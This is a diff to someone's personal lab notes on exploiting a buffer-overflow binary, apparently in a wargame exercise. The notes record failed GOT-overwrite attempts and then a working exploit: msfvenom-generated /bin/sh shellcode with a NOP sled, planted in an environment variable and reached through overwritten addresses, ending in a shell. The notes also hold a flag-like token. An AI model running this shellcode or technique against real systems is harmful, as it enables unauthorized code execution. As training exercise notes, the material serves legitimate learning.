@@ -145,6 +145,8 @@ https://security.stackexchange.com/questions/13194/finding-environment-variables
 ![[Pasted image 20260701190231.png]]
 ![[Pasted image 20260701190639.png]]
 
+
+
 if you export env in different terminal you will not see in gdb 
 
 SC is at `0xffffde4f` but that includes the `SC=` prefix (3 bytes)
@@ -185,6 +187,8 @@ will need to change the address
 since it was crashing i went lower 
 
 ![[Pasted image 20260701232658.png]]
+
+
 ret_addr = b"\x42\xde\xff\xff"
 
 sh-5.3$ win
@@ -270,6 +274,8 @@ Per the  usually the exact same function
 
 https://infosecwriteups.com/got-overwrite-bb9ff5414628
 
+# Trial 1 
+
 ![[Pasted image 20260705165459.png]]
 
 ![[Pasted image 20260705170132.png]]
@@ -280,3 +286,193 @@ https://infosecwriteups.com/got-overwrite-bb9ff5414628
 ![[Pasted image 20260705170302.png]]
 
 set *0x56556020=0xf7dc98b0
+
+![[Pasted image 20260705172521.png]]
+
+![[Pasted image 20260705173659.png]]
+
+### So the full permission breakdown is
+
+```
+r = readable
+w = writable  
+x = executable
+- = permission not granted
+p = private (copy-on-write)
+s = shared
+```
+**Private (`p`):**  
+The mapping is **copy-on-write**. If this process tries to modify these pages, the kernel gives it its own private copy — changes are invisible to other processes and don't affect the original file on disk.
+
+**Shared (`s`):**  
+Changes to this mapping are visible to other processes and written back to the underlying file.
+
+
+RELRO blocking the GOT overwrite attempt.
+
+# Trial 2 
+
+# We are overwriting exit instead of printf 
+
+
+Timing of when each function gets called:
+
+strcpy(buffer, argv[1]);     ← copy happens here
+strcpy(p, argv[2]);          ← overwrite happens HERE
+                             
+fprintf(stdout, "%s\n", buffer);  ← called AFTER overwrite
+exit(0);                          ← called AFTER fprintf
+
+**fprintf argument problem:**
+
+c
+
+```c
+fprintf(stdout, "%s\n", buffer);
+```
+
+fprintf takes **3 arguments** — stdout, a format string, and buffer. If you redirect `fprintf` to `system`, it becomes:
+
+c
+
+```c
+system(stdout, "%s\n", buffer);
+```
+
+`system` only looks at its **first argument**, which would be `stdout` — a file descriptor pointer, not `/bin/sh`. So you'd be calling `system(stdout_pointer)` which is garbage.
+
+```
+argv[1] = "/bin/sh"              ← lands at buffer[0]
+argv[2] = [padding to reach GOT] + [address of system] + [anything] + [address of buffer]
+```
+
+So when `system` gets called instead of `exit`, the address of `buffer` (which contains `/bin/sh`) is already in the right place on the stack as the argument.
+
+![[Pasted image 20260705181405.png]]
+
+![[Pasted image 20260705181457.png]]
+
+![[Pasted image 20260705181519.png]]
+
+we need to check the **actual runtime address** of the GOT entry, not the offset from objdump
+
+figure out the distance from `p` to the GOT entry:
+
+bash
+
+```bash
+(gdb) p address of system - (address of buffer + 7)
+```
+
+That distance tells you how much padding to put in `argv[2]` before the system address.
+this will not work cause system will be in text region
+# Trial 3 
+
+buffer address 
+![[Pasted image 20260705235704.png]]
+
+p 
+![[Pasted image 20260705235909.png]]
+
+# Attack Method : 
+
+argument 1 (128  bytes x A's padding + exit address ) argument 2(environment variable )
+
+environment variable = shellcode - NOPS and null character. 
+
+##  Trying to find exit address 
+
+![[Pasted image 20260706001415.png]]
+
+per disas 
+
+![[Pasted image 20260706001514.png]]
+![[Pasted image 20260706002128.png]]
+
+How to find the ebx value 
+
+![[Pasted image 20260706002639.png]]
+
+`0x56558ff4` + `0x18` = **`0x5655900c`**
+
+\x0c\x90\x55\x56
+# Crafting the shellcode 
+
+because we are doing string copy the null bytes should not be there. 
+
+msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00' -f python
+
+![[Pasted image 20260706003153.png]]
+
+## Testing the shellcode 
+
+![[Pasted image 20260706003618.png]]
+
+# Putting the shellcode in environment variable 
+
+export SC=$(python3 -c '
+import sys
+buf  = b"\x90" * 100   
+buf += b"\xdd\xc2\xbf\xb3\x2b\x82\x09\xd9\x74\x24\xf4\x58"
+buf += b"\x31\xc9\xb1\x0b\x31\x78\x1a\x83\xc0\x04\x03\x78"
+buf += b"\x16\xe2\x46\x41\x89\x51\x31\xc4\xeb\x09\x6c\x8a"
+buf += b"\x7a\x2e\x06\x63\x0e\xd9\xd6\x13\xdf\x7b\xbf\x8d"
+buf += b"\x96\x9f\x6d\xba\xa1\x5f\x91\x3a\x9d\x3d\xf8\x54"
+buf += b"\xce\xb2\x92\xa8\x47\x66\xeb\x48\xaa\x08"
+sys.stdout.buffer.write(buf)
+')
+
+## Making sure it is in the same terminal 
+
+
+export SC=$(python3 -c '
+import sys
+buf  = b"\x90" * 100   
+buf += b"\xdd\xc2\xbf\xb3\x2b\x82\x09\xd9\x74\x24\xf4\x58"
+buf += b"\x31\xc9\xb1\x0b\x31\x78\x1a\x83\xc0\x04\x03\x78"
+buf += b"\x16\xe2\x46\x41\x89\x51\x31\xc4\xeb\x09\x6c\x8a"
+buf += b"\x7a\x2e\x06\x63\x0e\xd9\xd6\x13\xdf\x7b\xbf\x8d"
+buf += b"\x96\x9f\x6d\xba\xa1\x5f\x91\x3a\x9d\x3d\xf8\x54"
+buf += b"\xce\xb2\x92\xa8\x47\x66\xeb\x48\xaa\x08"
+sys.stdout.buffer.write(buf)
+')
+
+![[Pasted image 20260706003932.png]]
+
+# Find the address of the enviornment variable 
+
+https://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow
+
+![[Pasted image 20260706010137.png]]
+
+Thinking of picking up the middle of NOP sled 
+
+![[Pasted image 20260706010732.png]]
+
+The exploit 
+
+(gdb) r `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*128 + b"\x0c\x90\x55\x56")'` `python3 -c 'import sys; sys.stdout.buffer.write(b"\x1c\xde\xff\xff")'`
+
+
+![[Pasted image 20260706010840.png]]
+
+it worked now trying no_aslr 
+
+![[Pasted image 20260706011240.png]]
+
+![[Pasted image 20260706011322.png]]
+
+trying to adjust 
+
+silly mistake!
+
+[hacker22@warhead bin]$ ./concat_noaslr `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*128 + b"\x0c\x90\x55\x56")'` `python3 -
+c 'import sys; sys.stdout.buffer.write(b"\x1c\xde\xff\xff")'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+                                                                                                                                �UV
+sh-5.3$
+
+
+![[Pasted image 20260706011558.png]]
+
+22-whWNwzvsTn95Q8qa8ZQNqQ-22
